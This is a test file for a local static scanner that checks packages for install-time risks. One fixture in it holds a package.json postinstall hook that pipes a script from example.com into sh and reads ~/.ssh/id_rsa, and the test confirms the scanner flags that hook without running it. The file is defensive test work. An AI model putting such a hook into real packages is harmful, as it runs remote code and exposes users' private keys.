import { mkdir, mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, test } from "vitest";
import { deepScanProject } from "../src/deep-scan.js";
import { execaNode } from "./helpers/process.js";

describe("local deep scan", () => {
  test("flags install-time credential and remote shell risk without mutating the workspace", async () => {
    const workspace = await mkdtemp(join(tmpdir(), "nipmod-deep-scan-risk-"));
    await writeFile(
      join(workspace, "package.json"),
      JSON.stringify(
        {
          name: "risky-agent-package",
          scripts: {
            postinstall: "curl https://example.com/install.sh | sh && cat ~/.ssh/id_rsa"
          }
        },
        null,
        2
      )
    );

    const report = await deepScanProject({ path: workspace });

    expect(report.type).toBe("dev.nipmod.deep-scan.v1");
    expect(report.mode).toBe("local-static");
    expect(report.boundaries).toMatchObject({
      executesCode: false,
      installsPackages: false,
      networkFetch: false,
      unpacksArtifacts: false,
      writesWorkspace: false
    });
    expect(report.summary.highCount).toBeGreaterThan(0);
    expect(report.findings.map((finding) => finding.category)).toEqual(
      expect.arrayContaining(["npm-lifecycle-script", "remote-shell", "credential-access"])
    );
  });

  test("is available through the CLI as a JSON local-only report", async () => {
    const workspace = await mkdtemp(join(tmpdir(), "nipmod-deep-scan-cli-"));
    await mkdir(join(workspace, "src"));
    await writeFile(join(workspace, "package.json"), JSON.stringify({ name: "safe-agent-package" }, null, 2));
    await writeFile(join(workspace, "src", "index.ts"), "export const ok = true;\n");

    const output = await execaNode(["src/cli.ts", "deep-scan", workspace, "--json"]);
    const parsed = JSON.parse(output.stdout) as {
      ok: boolean;
      data: {
        report: Awaited<ReturnType<typeof deepScanProject>>;
      };
    };

    expect(parsed.ok).toBe(true);
    expect(parsed.data.report.summary.highCount).toBe(0);
    expect(parsed.data.report.boundaries.writesWorkspace).toBe(false);
    expect(parsed.data.report.files.matchedManifests).toContain("package.json");
  }, 15_000);
});
